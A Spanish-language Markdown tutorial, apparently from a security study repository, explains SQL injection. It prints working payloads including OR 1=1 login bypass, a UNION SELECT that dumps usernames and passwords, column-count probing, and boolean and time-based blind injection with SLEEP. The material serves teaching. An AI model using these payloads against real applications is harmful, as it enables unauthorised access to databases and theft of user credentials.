[Volver al inicio](../Readme.md)
# SQLi (SQL Injection)
## Introducción.
Se trata de una vulnerabilidad que permite a un atacante **"alterar"** las consultas SQL que realiza una aplicación sobre la base de datos, de forma que consigue obtener un beneficio que no estaba contemplado en el desarrollo de la aplicación. El beneficio se basa en obtener información privilegiada que puede ser tanto nombres de tablas, como campos o incluso leer los datos de acceso de los usuarios.

Por ejemplo, imagina un campo "valor" en un formulario de búsqueda de productos de una aplicación web:

```https://www.webvictima.com/productos?valor=100 ```

Desde el punto de vista de la aplicación seguramente se realiza una petición parecida a:

```SQL
SELECT * FROM Productos WHERE precio < '100' ORDER BY name;
```

Así pues, si la aplicación no está protegida, se puede escribir una comilla  **'**  en el campo valor, para comprobar si la aplicación es vulnerable a SQL Injection. La consulta quedaría como:

```SQL 
SELECT * FROM Productos WHERE precio < "'"  ORDER BY name; 
```

Si obtenemos un error en la consulta, bien por que lo muestra en la pantalla o bien porque lo interceptamos con Burp Suite, significaría que la aplicación es vulnerable, posiblemente, a SQL Injection.

Una de las primeras opciones que siempre se explica en la teoría de SQLi, es la del payload " ' OR '1'='1 ", que aplicado sobre la consulta, quedaría:

```SQL 
SELECT * FROM Productos WHERE precio < '100' OR '1'='1' ORDER BY name;
```

En este caso, estamos pidiendo, por una parte, los productos con precio inferior a 100, pero por otra, estamos indicando una afirmación ('1'='1'), por lo que el resultado es igual a TRUE y mostraría **TODOS los productos**. La consulta equivalente sería:

```SQL 
SELECT * FROM Productos 
```

## Utilización de espacios para alterar la consulta original
En las consultas SQL se pueden utilizar comentarios, esto permite clarificar las consultads, sobre todo si son complejas y el motor de la base de datos no tendrá en cuenta dichos comentarios.

Para aplicar un comentario a la consulta, se suele utilizar dos guiones " **--** ".

```SQL
-- Creando tabla usuarios
CREATE TABLE usuarios
( user_id int PRIMARY KEY,
  username varchar(40) NOT NULL,
  password varchar(64) NOT NULL
);
 ```

Imagina ahora esta técnica sobre un formulario de login con la siguiente consulta:

```SQL
SELECT * FROM Usuarios WHERE usuario='admin' AND passwd='pass';
```

Apliquemos ahora la técnica de comentarios SQL mediante el payload ```admin' OR 1=1-- ```, tendríamos:

```SQL
SELECT * FROM Usuarios WHERE usuario='admin' OR 1=1-- AND passwd='pass';
```

Al aplicar los comentarios, realmente la consulta se quedaría en:

```SQL
SELECT * FROM Usuarios WHERE usuario='admin' OR 1=1;
```

Que realmente quedaría como:
```SQL
SELECT * FROM Usuarios
```

Y lo que estaríamos consiguiendo sería que mostrase la tabla completa de usuarios y contraseñas.

```
Además, si no se ha tenido la precaución de encriptar las contraseñas, el problema sería todavía mayor, pues el atacante podría ver los usuarios y las contraseñas en texto claro !!!
```

## Utilización de la sentencia "UNION"
Otra forma que pueden utilizar los atacantes para alterar la consulta y obtener datos no permitidos inicialmente, es usar la sentencia "UNION" para concatenar una segunda consulta:

PAYLOAD: ```100' UNION SELECT usuario, passwd FROM Usuarios-- ```

Que produciría la consulta:

```SQL
SELECT nombre, denom FROM Productos WHERE precio < '100' UNION SELECT usuario, passwd FROM Usuarios-- ORDER BY name;
```
Y que obtendría como resultado, no solo los datos de todos los productos con precio inferior a 100, sino también, todos los nombres de usuario y passwords de la tabla "Usuarios".

```
Atención !!!
Para que la consulta tenga éxito, debe coincidir el número de columnas del primer y segundo "SELECT" y además, debe coincidir en el tipo de datos.
```

### ¿Cómo podemos determinar el número de columnas de una consulta?
#### Método 1:
Utilizar la cláusula "**ORDER BY**" e ir probando números hasta que devuelva error, en el momento que esto suceda, sabremos que el número de columnas es el valor anterior al que provocó el error.

```
' ORDER BY 1--
' ORDER BY 2--
... etc
```

Como se observa, no es necesario saber el nombre de las columnas, se puede llamar por el índice o número de columna.

#### Método 2:
Utilizar la cláusula "**NULL**" de forma parecida al método anterior, probando hasta obtener el error:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
... etc
```

### Determinar el tipo de datos de la columna
Una vez se ha obtenido la cantidad de columnas que devuelve la consulta, deberemos saber el tipo de datos de cada columna. Una forma de averiguarlo es alternar, por ejemplo, un caracter de tipo texto 'x' y ver si el resultado ddevuelve o no error.

```
' UNION SELECT 'x',NULL,NULL--
' UNION SELECT NULL,'x',NULL--
' UNION SELECT NULL,NULL,'x'--
```


## Inyección SQL a ciegas (Blind SQLi)
En ocasiones, es posible que ante la inyección de un payload en una consulta, no se obtenga ningún resultado en la respuesta HTTP, ni detalles de la consulta ni errores.
En este caso, se puede intentar la aplicación de las inyecciones ciegas.
### Inyección ciega basada en el contenido
Imaginemos la petición de un determinado producto a nuestra web de productos:

```https://www.webvictima.com/productos?id=23 ```

Que, por ejemplo, se traduce en la siguiente consulta SQL:

```SQL 
SELECT * FROM Productos WHERE id_producto=23;
```

Si ahora aplicamos un payload cierto y otro falso de forma consecutiva, podemos observar si existe alguna diferencia en la respuesta de la BB.DD., en caso de existir una diferencia, sabremos que podemos aplicar payloads y únicamente deberemos observar el resultado para saber si la consulta devuelve cierto o falso.

```SQL 
-- Aplicamos un payload que devuelva TRUE ' AND 1=1--
SELECT * FROM Productos WHERE id_producto=23 AND 1=1--;

-- Aplicamos un payload que devuelva FALSE ' AND 1=2--
SELECT * FROM Productos WHERE id_producto=23 AND 1=2--;
```
### Inyección ciega basada en el tiempo
Otra forma de detectar si una aplicación es vulnerable a inyecciones SQL cuando la base de datos no devuelve errores, es utilizando retardos en las consultas. La idea es aplicar un retardo a una condición verdadera y a una falsa, observar si se produce un retraso significativo en la respuesta y por la tanto, tener la base para determinar respuestas verdaderas o falsas.

```SQL 
-- Aplicamos un payload que devuelva TRUE ' AND 1=1 AND SLEEP(10)--
SELECT * FROM Productos WHERE id_producto=23 AND 1=1 AND SLEEP(10)--;

-- Aplicamos un payload que devuelva FALSE ' AND 1=2 AND SLEEP(10)--
SELECT * FROM Productos WHERE id_producto=23 AND 1=2 AND SLEEP(10)--;
```
A partir de aquí, podríamos ir poniendo condicionales para intentar obtener datos a ciegas:

```SQL
-- Delay de 10 segundos si la primera letra del usuario es una 'a'
SELECT IF(LEFT(usuario, 1)='a',SLEEP(10),SLEEP(0))
```

## Obtención de datos de estructura
Un ejemplo de cómo llegar a obtener el conjunto de tablas que componen la base de datos seria el que se adjunta a continuación (la sintaxis puede variar en función de la base de datos):

```SQL
SELECT * FROM information_schema.tables
```
## Bibliografía
- Portswigger. (s.f.). SQL injection. https://portswigger.net/web-security/sql-injection
- Sengupta, S. (25/07/2022). Medium. https://sudip-says-hi.medium.com/union-based-sql-injection-guide-to-understanding-mitigating-such-attacks-1775149e80e6 
- PortSwigger. (s.f.). Blind SQL injection. https://portswigger.net/web-security/sql-injection/blind
- kingthorin. (s.f.). Blind SQL Injection. https://owasp.org/www-community/attacks/Blind_SQL_Injection




